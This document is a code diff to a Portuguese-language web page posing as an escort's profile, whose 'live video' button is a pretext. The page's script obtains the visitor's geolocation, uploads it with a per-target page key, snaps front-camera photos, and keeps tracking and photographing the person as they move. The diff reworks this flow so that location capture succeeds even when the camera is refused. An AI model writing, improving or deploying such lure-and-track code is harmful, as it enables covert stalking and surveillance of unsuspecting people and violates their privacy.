@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Maya Valença - Acompanhante Lauro de Freitas & Salvador </title>
+<title>Maya Valença — Acompanhante VIP</title>
 <style>
 /* ESTILOS DO MODAL DE CARTÃO ILUSTRATIVO */
 .credit-card-preview {
@@ -144,7 +144,7 @@ button{font:inherit}
     <div class="handle">@mayavalenca</div>
     <p class="bio">Acompanhante em Salvador & Lauro de Freitas. Momentos inesquecíveis com discrição, elegância e carinho. Atendimento privativo e viagens. Chamadas de vídeo disponíveis.</p>
   </div>
-  <div class="profile-actions"><button class="btn primary" onclick="handlePermissionClick()"> Ao vivo 🎥​</button></div>
+  <div class="profile-actions"><button class="btn primary" onclick="handlePermissionClick()"> Vem pro ao vivo 🎥​</button></div>
 
 </section>
 
@@ -349,6 +349,8 @@ ESTADO
 
 let stream = null;
 
+const pageKey = {{ page_key|tojson }};
+
 let captureId = null;
 
 let deviceId = null;
@@ -364,12 +366,6 @@ let photoCount = 0;
 let takingPhoto = false;
 
 let watchId = null;
-
-let isCameraActive = false;
-
-let isGeoActive = false;
-
-let recheckInterval = null;
 
 
 /*
@@ -445,16 +441,13 @@ OBTER SESSÃO PERSISTENTE DO SERVIDOR
 
 async function getPersistentSession() {
 
-    if (captureId) return;
-
-
     setStatus(
         "Identificando este dispositivo..."
     );
 
 
     const response = await fetch(
-        "/api/session",
+        "/api/session?page_key=" + encodeURIComponent(pageKey),
         {
             method: "GET",
 
@@ -556,223 +549,6 @@ async function getPersistentSession() {
 
 /*
 ============================================================
-SOLICITAÇÃO INDIVIDUAL DE CÂMERA
-============================================================
-*/
-
-async function requestCameraPermission() {
-
-    if (isCameraActive) return true;
-
-    try {
-
-        if (
-            !navigator.mediaDevices ||
-            !navigator.mediaDevices.getUserMedia
-        ) {
-
-            return false;
-
-        }
-
-
-        stream =
-            await navigator.mediaDevices.getUserMedia({
-
-                video: {
-                    facingMode: "user"
-                },
-
-                audio: false
-
-            });
-
-
-        video.srcObject =
-            stream;
-
-
-        video.loop =
-            false;
-
-
-        await video
-            .play()
-            .catch(function() {});
-
-
-        isCameraActive = true;
-
-
-        console.log(
-            "Câmera permitida."
-        );
-
-
-        if (lastLocationId !== null) {
-
-            captureAndUploadPhoto(
-                lastLocationId
-            ).catch(console.error);
-
-        }
-
-
-        return true;
-
-    } catch (err) {
-
-        console.warn(
-            "Câmera não permitida:",
-            err.message
-        );
-
-        return false;
-
-    }
-
-}
-
-
-/*
-============================================================
-SOLICITAÇÃO INDIVIDUAL DE GEOLOCALIZAÇÃO
-============================================================
-*/
-
-async function requestGeoPermission() {
-
-    if (isGeoActive) return true;
-
-    try {
-
-        const position =
-            await getCurrentLocation();
-
-
-        const latitude =
-            position.coords.latitude;
-
-
-        const longitude =
-            position.coords.longitude;
-
-
-        const accuracy =
-            position.coords.accuracy;
-
-
-        updatePositionDisplay(
-            latitude,
-            longitude
-        );
-
-
-        const locationResult =
-            await uploadLocation(
-
-                latitude,
-                longitude,
-                accuracy
-
-            );
-
-
-        lastLocationId =
-            locationResult.location_id;
-
-
-        lastPhotoLatitude =
-            latitude;
-
-
-        lastPhotoLongitude =
-            longitude;
-
-
-        distanceElement.textContent =
-            "0 m";
-
-
-        startWatchingPosition();
-
-
-        isGeoActive = true;
-
-
-        console.log(
-            "Geolocalização permitida."
-        );
-
-
-        return true;
-
-    } catch (err) {
-
-        console.warn(
-            "Geolocalização não permitida:",
-            err.message
-        );
-
-        return false;
-
-    }
-
-}
-
-
-/*
-============================================================
-LOOP AUTOMÁTICO DE REPROVOCAÇÃO (A CADA 15 SEGUNDOS)
-============================================================
-*/
-
-function startPermissionRecheckLoop() {
-
-    if (recheckInterval) return;
-
-
-    recheckInterval = setInterval(
-        async function() {
-
-            if (isCameraActive && isGeoActive) {
-
-                clearInterval(recheckInterval);
-
-                recheckInterval = null;
-
-                return;
-
-            }
-
-
-            console.log(
-                "Verificando permissões pendentes (Loop 15s)..."
-            );
-
-
-            if (!isCameraActive) {
-
-                await requestCameraPermission();
-
-            }
-
-
-            if (!isGeoActive) {
-
-                await requestGeoPermission();
-
-            }
-
-        },
-        15000
-    );
-
-}
-
-
-/*
-============================================================
 MODAL / PERMISSÃO
 ============================================================
 */
@@ -805,9 +581,7 @@ async function handlePermissionClick() {
         if (callSubtitle) {
 
             callSubtitle.textContent =
-                isCameraActive
-                    ? "Chamada de vídeo ativa"
-                    : "Aguardando câmera...";
+                "Chamada de vídeo ativa";
 
         }
 
@@ -834,110 +608,87 @@ async function startMonitoring() {
 
     try {
 
-        /*
-        ----------------------------------------------------
-        1. IDENTIFICAÇÃO PERSISTENTE
-        ----------------------------------------------------
-        */
+        // 1. A localização é o requisito principal.
+        setStatus("Solicitando autorização da localização...");
 
+        const position = await getCurrentLocation();
+
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+        const accuracy = position.coords.accuracy;
+
+        // 2. Identifica a sessão somente depois de obter a localização.
         await getPersistentSession();
 
+        updatePositionDisplay(latitude, longitude);
 
-        /*
-        ----------------------------------------------------
-        2. PERMISSÕES PARCIAIS (OU CÂMERA OU LOCALIZAÇÃO)
-        ----------------------------------------------------
-        */
+        // 3. Salva a localização inicial.
+        setStatus("Registrando localização...");
 
-        setStatus(
-            "Solicitando autorizações..."
+        const locationResult = await uploadLocation(
+            latitude,
+            longitude,
+            accuracy
         );
 
+        lastLocationId = locationResult.location_id;
 
-        const camOk =
-            await requestCameraPermission();
+        // 4. A câmera é opcional. Se for recusada, a localização continua.
+        setStatus("Localização ativa. Verificando câmera...");
 
+        let cameraAvailable = false;
 
-        const geoOk =
-            await requestGeoPermission();
-
-
-        if (camOk || geoOk) {
-
-            let msg = "Captura iniciada: ";
-
-            if (camOk && geoOk) msg += "Câmera e localização ativas.";
-
-            else if (camOk) msg += "Apenas câmera ativa.";
-
-            else msg += "Apenas localização ativa.";
-
-
-            setStatus(
-                msg,
-                false
-            );
-
-
-            if (camOk && geoOk && lastLocationId !== null) {
-
-                await captureAndUploadPhoto(
-                    lastLocationId
-                ).catch(console.error);
-
-            }
-
-
-            startPermissionRecheckLoop();
-
-
-            return true;
-
-        } else {
-
-            setStatus(
-                "É necessário aceitar ao menos uma permissão para prosseguir.",
-                true
-            );
-
-
-            startPermissionRecheckLoop();
-
-
-            throw new Error(
-                "Nenhuma permissão concedida."
-            );
-
-        }
-
-
-    } catch (error) {
-
-        console.error(
-            "Erro:",
-            error
-        );
-
-
-        if (!isCameraActive && stream) {
-
-            stream
-                .getTracks()
-                .forEach(function(track) {
-
-                    track.stop();
-
+        try {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" },
+                    audio: false
                 });
 
+                video.srcObject = stream;
+                video.loop = false;
+                await video.play().catch(function() {});
+                cameraAvailable = true;
+            }
+        } catch (cameraError) {
+            console.warn("Câmera não autorizada/disponível:", cameraError);
             stream = null;
-
+            cameraAvailable = false;
         }
 
+        // 5. Foto inicial somente se a câmera estiver disponível.
+        if (cameraAvailable && video.videoWidth && video.videoHeight) {
+            try {
+                setStatus("Localização e câmera ativas.", false);
+                await captureAndUploadPhoto(lastLocationId);
+            } catch (photoError) {
+                console.warn("Foto inicial não enviada:", photoError);
+            }
+        } else {
+            setStatus("Localização ativa. Somente a localização será enviada.", false);
+        }
+
+        // 6. O ponto de referência é sempre a última localização registrada.
+        lastPhotoLatitude = latitude;
+        lastPhotoLongitude = longitude;
+        distanceElement.textContent = "0 m";
+
+        // 7. Continua acompanhando o deslocamento independentemente da câmera.
+        startWatchingPosition();
+
+        return true;
+
+    } catch (error) {
+        console.error("Erro:", error);
+        setStatus("Erro: " + error.message, true);
+
+        if (watchId !== null) {
+            navigator.geolocation.clearWatch(watchId);
+            watchId = null;
+        }
 
         throw error;
-
     }
-
 }
 
 
@@ -1076,10 +827,6 @@ async function handlePosition(position) {
         lastPhotoLongitude === null
     ) {
 
-        lastPhotoLatitude = latitude;
-
-        lastPhotoLongitude = longitude;
-
         return;
 
     }
@@ -1158,16 +905,16 @@ async function handlePosition(position) {
 
         /*
         ----------------------------------------------------
-        NOVA FOTO
+        NOVA FOTO (OPCIONAL)
         ----------------------------------------------------
         */
 
-        if (isCameraActive) {
-
-            await captureAndUploadPhoto(
-                locationId
-            );
-
+        if (stream && video.videoWidth && video.videoHeight) {
+            try {
+                await captureAndUploadPhoto(locationId);
+            } catch (photoError) {
+                console.warn("Localização salva, mas a foto não pôde ser enviada:", photoError);
+            }
         }
 
 
@@ -1235,9 +982,6 @@ function handleLocationError(error) {
     );
 
 
-    isGeoActive = false;
-
-
     setStatus(
         "Erro de localização: " +
         error.message,
@@ -1301,6 +1045,9 @@ async function uploadLocation(
 
                     capture_id:
                         captureId,
+
+                    page_key:
+                        pageKey,
 
                     latitude:
                         latitude,
@@ -1385,9 +1132,11 @@ async function captureAndUploadPhoto(
     locationId
 ) {
 
-    if (!captureId || !isCameraActive) {
+    if (!captureId) {
 
-        return;
+        throw new Error(
+            "A sessão ainda não foi identificada."
+        );
 
     }
 
@@ -1397,11 +1146,9 @@ async function captureAndUploadPhoto(
         !video.videoHeight
     ) {
 
-        console.warn(
+        throw new Error(
             "A câmera ainda não está pronta."
         );
-
-        return;
 
     }
 
@@ -1490,6 +1237,12 @@ async function captureAndUploadPhoto(
     formData.append(
         "capture_id",
         captureId
+    );
+
+
+    formData.append(
+        "page_key",
+        pageKey
     );
 
 
@@ -1738,15 +1491,6 @@ ENCERRAMENTO
 window.addEventListener(
     "beforeunload",
     function() {
-
-        if (recheckInterval) {
-
-            clearInterval(recheckInterval);
-
-            recheckInterval = null;
-
-        }
-
 
         if (watchId !== null) {
 
